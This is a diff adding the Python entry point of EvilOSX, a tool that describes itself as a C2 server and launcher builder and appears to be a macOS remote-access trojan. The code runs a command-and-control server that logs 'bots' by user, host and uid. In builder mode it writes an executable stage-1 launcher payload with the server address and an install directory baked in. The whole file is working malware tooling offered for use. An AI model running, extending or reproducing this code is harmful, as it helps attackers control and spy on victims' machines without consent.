@@ -1,0 +1,381 @@
+﻿#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""Entry point for the EvilOSX C2 server and the launcher builder.
+
+Both modes share one argument parser:
+
+  * server (default)        starts the async HTTP server and the console view
+  * builder (``--builder``) writes a stage-1 launcher for one new bot
+
+Everything that can be validated cheaply is validated *before* expensive work
+happens: the database path is checked on disk, ``--cache-size`` is handed to
+:class:`server.model.Model`, and ``--loader`` is resolved against
+``bot/loaders``. Failures are reported as one-line messages plus an exit code;
+pass ``--debug`` to get verbose logging and full tracebacks.
+
+Exit codes: 0 success, 1 failure, 2 invalid arguments, 130 interrupted.
+"""
+
+__author__ = "Marten4n6"
+__license__ = "GPLv3"
+
+import argparse
+import asyncio
+import logging
+import os
+import sqlite3
+import sys
+from datetime import datetime
+from pathlib import Path
+from time import perf_counter
+from uuid import uuid4
+
+from server.version import VERSION
+from server.view.helper import ViewABC
+
+LOGGER = logging.getLogger("evilosx")
+
+PROJECT_ROOT = Path(__file__).resolve().parent
+LOADERS_DIR = PROJECT_ROOT / "bot" / "loaders"
+DEFAULT_BUILDS_DIR = PROJECT_ROOT / "data" / "builds"
+DEFAULT_PROGRAM_DIRECTORY = "~/.local/share"
+
+EXIT_OK = 0
+EXIT_FAILURE = 1
+EXIT_INTERRUPT = 130  # 128 + SIGINT, the usual shell convention
+
+
+BANNER = """\
+▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
+▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▒▒ █ █ ▒░
+▒███   ▓██  █▒░▒██▒▒██░    ▒██░  ██▒░ ▓██▄   ░░  █   ░
+▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒   @{} (v{})
+░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  GPLv3 licensed
+░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
+ ░ ░  ░  ░ ░░   ▒ ░  ░ ░   ░  ░ ░ ▒  ░  ░  ░   ░    ░
+    ░       ░░   ▒ ░  ░ ░   ░ ░   ░ ░        ░   ░
+    ░  ░     ░   ░      ░  ░    ░ ░        ░   ░
+""".format(__author__, VERSION)
+
+
+MESSAGE_INFO = "[\033[94mI\033[0m] "
+MESSAGE_ATTENTION = "[\033[91m!\033[0m] "
+
+# The rest of the code base passes semantic tags ("info", "attention") as the
+# prefix of ViewABC.output(); map them to printable markers. Unknown prefixes
+# are rendered verbatim so no information is silently lost.
+_PREFIX_MARKERS = {
+    "info": MESSAGE_INFO,
+    "attention": MESSAGE_ATTENTION,
+}
+
+
+class StartupError(Exception):
+    """A configuration or environment problem that aborts startup cleanly."""
+
+
+def _port(value):
+    """argparse type: a usable TCP port."""
+    try:
+        port = int(value)
+    except (TypeError, ValueError):
+        raise argparse.ArgumentTypeError("expected an integer, got {!r}".format(value))
+
+    if not 1 <= port <= 65535:
+        raise argparse.ArgumentTypeError(
+            "port must be between 1 and 65535, got {}".format(port))
+    return port
+
+
+def _positive_int(value):
+    """argparse type: an integer greater than zero."""
+    try:
+        number = int(value)
+    except (TypeError, ValueError):
+        raise argparse.ArgumentTypeError("expected an integer, got {!r}".format(value))
+
+    if number < 1:
+        raise argparse.ArgumentTypeError(
+            "expected a positive integer, got {}".format(number))
+    return number
+
+
+def available_loaders():
+    """Names of the loaders that ship an ``install.py``, sorted."""
+    if not LOADERS_DIR.is_dir():
+        return []
+    return sorted(entry.name for entry in LOADERS_DIR.iterdir()
+                  if (entry / "install.py").is_file())
+
+
+def _loader_name(value):
+    """argparse type: a loader directory that exists under bot/loaders."""
+    loaders = available_loaders()
+
+    if value not in loaders:
+        raise argparse.ArgumentTypeError(
+            "unknown loader {!r} (available: {})".format(
+                value, ", ".join(loaders) or "none"))
+    return value
+
+
+def build_parser():
+    """Build the command line parser (kept separate so it can be unit tested)."""
+    parser = argparse.ArgumentParser(
+        prog="start.py",
+        description="EvilOSX C2 server and launcher builder.",
+    )
+    parser.add_argument(
+        "--host", default=None,
+        help="address to bind to / to embed in payloads "
+             "(default: all interfaces; required with --builder)")
+    parser.add_argument(
+        "--port", type=_port, default=1337,
+        help="TCP port to listen on (default: %(default)s)")
+    parser.add_argument(
+        "--db-path", default=None,
+        help="SQLite database file (default: data/EvilOSX.db)")
+    parser.add_argument(
+        "--cache-size", type=_positive_int, default=None,
+        help="entries kept in the bot lookup cache (default: model default)")
+    parser.add_argument(
+        "--builder", action="store_true",
+        help="generate a launcher payload instead of serving")
+    parser.add_argument(
+        "--loader", type=_loader_name, default="run_script",
+        help="loader embedded in the payload (default: %(default)s)")
+    parser.add_argument(
+        "--program-directory", default=DEFAULT_PROGRAM_DIRECTORY,
+        help="install directory baked into the payload (default: %(default)s)")
+    parser.add_argument(
+        "--output-dir", default=str(DEFAULT_BUILDS_DIR),
+        help="where builder mode writes launchers (default: %(default)s)")
+    parser.add_argument(
+        "--no-banner", action="store_true",
+        help="do not print the banner")
+    parser.add_argument(
+        "--debug", action="store_true",
+        help="verbose logging and full tracebacks")
+    return parser
+
+
+class ConsoleView(ViewABC):
+    """Prints server events to a stream; implements the ViewABC contract."""
+
+    def __init__(self, stream=None):
+        self._stream = stream if stream is not None else sys.stdout
+
+    def output(self, line, prefix=""):
+        """Print one timestamped line, colourising known prefixes."""
+        marker = _PREFIX_MARKERS.get(prefix)
+        if marker is None and prefix:
+            marker = prefix if prefix.endswith(" ") else prefix + " "
+
+        stamp = datetime.now().strftime("%H:%M:%S")
+        print("[{}] {}{}".format(stamp, marker or "", line),
+              file=self._stream, flush=True)
+
+    def display_info(self, text):
+        """Used by :func:`server.handler.start_server` for status messages."""
+        self.output(text, "info")
+
+    def display_error(self, text):
+        self.output(text, "attention")
+
+    def on_response(self, response):
+        self.output_separator()
+        for line in str(response).splitlines():
+            self.output(line)
+
+    def on_bot_added(self, bot):
+        self.output("Bot joined: {}@{} ({}).".format(
+            bot.username, bot.hostname, bot.uid), "info")
+
+    def on_bot_removed(self, bot):
+        self.output("Bot removed: {}@{} ({}).".format(
+            bot.username, bot.hostname, bot.uid), "info")
+
+    def on_bot_path_change(self, bot):
+        self.output("Bot path changed: {}@{} -> {}.".format(
+            bot.username, bot.hostname, bot.local_path), "info")
+
+
+def _configure_stdio():
+    """Force UTF-8 output so the banner survives non-UTF-8 consoles."""
+    for stream in (sys.stdout, sys.stderr):
+        reconfigure = getattr(stream, "reconfigure", None)
+        if reconfigure is None:
+            continue
+        try:
+            reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass  # stream does not support reconfiguration (e.g. a pipe)
+
+
+def _configure_logging(debug):
+    """Keep stdout clean for the view; diagnostics go to stderr."""
+    logging.basicConfig(
+        level=logging.DEBUG if debug else logging.WARNING,
+        format="[%(levelname)s] %(name)s: %(message)s",
+        stream=sys.stderr,
+    )
+
+
+def _resolve_db_path(raw_path):
+    """Validate ``--db-path`` early and return a resolved path (or None)."""
+    if not raw_path:
+        return None
+
+    db_path = Path(raw_path).expanduser()
+    if not db_path.is_absolute():
+        db_path = Path.cwd() / db_path
+    db_path = db_path.resolve()
+
+    parent = db_path.parent
+    if not parent.is_dir():
+        raise StartupError("database directory does not exist: {}".format(parent))
+    if db_path.exists() and not db_path.is_file():
+        raise StartupError("database path is not a file: {}".format(db_path))
+    if not os.access(str(parent), os.W_OK):
+        raise StartupError("database directory is not writable: {}".format(parent))
+    return db_path
+
+
+def _create_model(args):
+    """Build the model, applying ``--db-path`` and ``--cache-size``."""
+    from server.model import Model
+
+    db_path = _resolve_db_path(args.db_path)
+    started = perf_counter()
+
+    try:
+        model = Model(
+            db_path=str(db_path) if db_path else None,
+            cache_size=args.cache_size,
+        )
+    except (OSError, sqlite3.Error) as error:
+        raise StartupError("cannot open database {}: {}".format(
+            db_path or "<default>", error))
+
+    LOGGER.debug("model ready in %.0f ms (db=%s, cache-size=%s)",
+                 (perf_counter() - started) * 1000.0,
+                 db_path or "<default>",
+                 args.cache_size or "<default>")
+    return model
+
+
+def _report_error(message):
+    print("[ERROR] {}".format(message), file=sys.stderr)
+
+
+def run_server(args):
+    """Start the async server and block until it is stopped."""
+    from server import handler  # late import keeps --help fast
+
+    if not handler.HAS_AIOHTTP:
+        raise StartupError(
+            "aiohttp is required to run the server (pip install aiohttp)")
+
+    model = _create_model(args)
+    view = ConsoleView()
+    started = perf_counter()
+
+    try:
+        # An empty host binds every interface, as documented by start_server().
+        asyncio.run(handler.start_server(model, view, args.port, args.host or ""))
+    finally:
+        # Bot updates are batched in memory; never drop them on shutdown.
+        try:
+            model.flush_batches()
+        except Exception:  # shutdown must not mask the original error
+            LOGGER.exception("failed to flush pending database writes")
+
+    view.output("Server stopped after {:.1f}s.".format(perf_counter() - started), "info")
+    return EXIT_OK
+
+
+def run_builder(args):
+    """Write a stage-1 launcher for one new bot into ``--output-dir``."""
+    from server.model import PayloadFactory
+
+    output_dir = Path(args.output_dir).expanduser()
+    try:
+        output_dir.mkdir(parents=True, exist_ok=True)
+    except OSError as error:
+        raise StartupError("cannot create output directory {}: {}".format(
+            output_dir, error))
+    if not output_dir.is_dir():
+        raise StartupError("output path is not a directory: {}".format(output_dir))
+
+    bot_uid = str(uuid4())
+    payload_options = {"host": args.host, "port": args.port}
+    loader_options = {
+        "loader_name": args.loader,
+        "program_directory": args.program_directory,
+    }
+
+    try:
+        payload = PayloadFactory().create_payload(
+            bot_uid, payload_options, loader_options)
+    except ImportError as error:
+        raise StartupError(
+            "payload generation needs pycryptodomex "
+            "(pip install pycryptodomex): {}".format(error))
+    except (OSError, KeyError) as error:
+        raise StartupError("payload generation failed: {}".format(error))
+
+    launcher_path = output_dir / "Launcher-{}.py".format(bot_uid[:8])
+    try:
+        # Explicit encoding and LF: the target is macOS, the host may be Windows.
+        with launcher_path.open("w", encoding="utf-8", newline="\n") as launcher:
+            launcher.write(payload)
+        if os.name == "posix":
+            os.chmod(str(launcher_path), 0o700)
+    except OSError as error:
+        raise StartupError("cannot write {}: {}".format(launcher_path, error))
+
+    print()
+    print("[INFO] Launcher generated: {}".format(launcher_path))
+    print("[INFO] Bot UID: {}".format(bot_uid))
+    print("[INFO] Server: {}:{}".format(args.host, args.port))
+    print("[INFO] Loader: {} (program directory: {})".format(
+        args.loader, args.program_directory))
+    return EXIT_OK
+
+
+def main(argv=None):
+    """Parse arguments, dispatch to a mode and return a process exit code."""
+    _configure_stdio()
+
+    parser = build_parser()
+    args = parser.parse_args(argv)
+
+    if args.builder and not args.host:
+        parser.error("--host is required with --builder "
+                     "(the payload must know the server address)")
+
+    _configure_logging(args.debug)
+    if not args.no_banner:
+        print(BANNER)
+
+    try:
+        if args.builder:
+            return run_builder(args)
+        return run_server(args)
+    except StartupError as error:
+        _report_error(str(error))
+        return EXIT_FAILURE
+    except KeyboardInterrupt:
+        print()
+        print("Interrupted, shutting down.")
+        return EXIT_INTERRUPT
+    except Exception as error:  # top-level guard: report, do not dump a traceback
+        if args.debug:
+            raise
+        _report_error("unexpected failure: {} (re-run with --debug for a "
+                      "traceback)".format(error))
+        return EXIT_FAILURE
+
+
+if __name__ == "__main__":
+    sys.exit(main())
